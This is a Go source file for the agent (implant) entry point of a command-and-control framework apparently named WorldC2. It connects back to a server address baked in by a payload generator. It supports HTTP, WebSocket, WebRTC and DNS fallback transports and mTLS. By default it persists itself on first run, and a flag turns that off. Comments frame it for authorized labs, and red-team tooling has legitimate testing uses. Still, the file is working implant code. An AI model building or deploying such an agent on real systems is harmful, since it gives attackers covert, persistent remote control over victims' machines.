package main

import (
	"crypto/tls"
	"flag"
	"fmt"
	"log"
	"os"
	"os/signal"
	"syscall"

	"github.com/Ruby570bocadito/WorldC2/src/go/internal/agent"
)

// DefaultServer is overridden at build time via -ldflags "-X main.DefaultServer=IP:PORT"
var DefaultServer = "127.0.0.1:8443"

func main() {
	serverAddr := flag.String("server", "", "C2 server address (host:port)")
	tlsCert := flag.String("tls-cert", "", "Client certificate PEM (mTLS deployments, issued via POST /api/mtls/cert)")
	tlsKey := flag.String("tls-key", "", "Client key PEM (mTLS deployments)")
	dnsDomain := flag.String("dns-domain", "", "Enable the DNS transport fallback for this domain (server needs matching transport.dns_domains)")
	noPersist := flag.Bool("no-persist", false, "Disable first-run auto-persistence (recommended for authorized labs)")
	httpPort := flag.String("http-port", "", "HTTP long-poll transport port (default 8445; must match server transport.http_port)")
	wsPort := flag.String("ws-port", "", "WebSocket transport port (default 8446; must match server transport.ws_port)")
	webrtcPort := flag.String("webrtc-port", "", "WebRTC transport port (default 8447; must match server transport.webrtc_port)")
	dnsPort := flag.String("dns-port", "", "DNS transport port (default 8444; must match server transport.dns_port)")

	// Also accept positional argument (./worldc2-agent 192.168.1.1:8443)
	flag.Parse()

	addr := *serverAddr

	// Fallback: positional argument
	if addr == "" && flag.NArg() > 0 {
		addr = flag.Arg(0)
	}

	// Fallback: environment variable
	if addr == "" {
		addr = os.Getenv("WORLDC2_SERVER")
	}

	// Fallback: compiled-in default (set by payload generator)
	if addr == "" {
		addr = DefaultServer
	}

	if addr == "" || addr == "AUTO" {
		fmt.Fprintf(os.Stderr, "Usage: agent --server <host:port>\n")
		fmt.Fprintf(os.Stderr, "  or set WORLDC2_SERVER environment variable\n")
		os.Exit(1)
	}

	a := agent.New(addr)

	// Auto-persistence opt-out: by default the agent reinstalls itself on
	// first run; lab operators can (and should) disable that here.
	if *noPersist {
		a.SetAutoPersist(false)
	}

	// Non-default transport ports: only applied when set; invalid values
	// are logged by the agent and fall back to the documented defaults.
	a.SetTransportPorts(*httpPort, *wsPort, *webrtcPort, *dnsPort)

	// Optional DNS transport fallback
	if *dnsDomain != "" {
		a.SetDNSDomain(*dnsDomain)
		log.Printf("[AGENT] DNS transport enabled for domain %q", *dnsDomain)
	}

	// Optional mTLS client certificate (server tls.mtls: true deployments)
	if *tlsCert != "" || *tlsKey != "" {
		if *tlsCert == "" || *tlsKey == "" {
			fmt.Fprintln(os.Stderr, "-tls-cert and -tls-key must be provided together")
			os.Exit(1)
		}
		cert, err := tls.LoadX509KeyPair(*tlsCert, *tlsKey)
		if err != nil {
			fmt.Fprintf(os.Stderr, "load client certificate: %v\n", err)
			os.Exit(1)
		}
		a.SetClientCert(cert)
		log.Println("[AGENT] mTLS client certificate loaded")
	}

	// Handle graceful shutdown
	sigCh := make(chan os.Signal, 1)
	signal.Notify(sigCh, syscall.SIGINT, syscall.SIGTERM)

	go func() {
		<-sigCh
		log.Println("[AGENT] Shutting down...")
		a.Stop()
	}()

	log.Printf("[AGENT] Starting agent - connecting to %s", addr)

	if err := a.Run(); err != nil {
		log.Printf("[AGENT] Agent error: %v", err)
		os.Exit(1)
	}

	log.Println("[AGENT] Agent exited.")
}
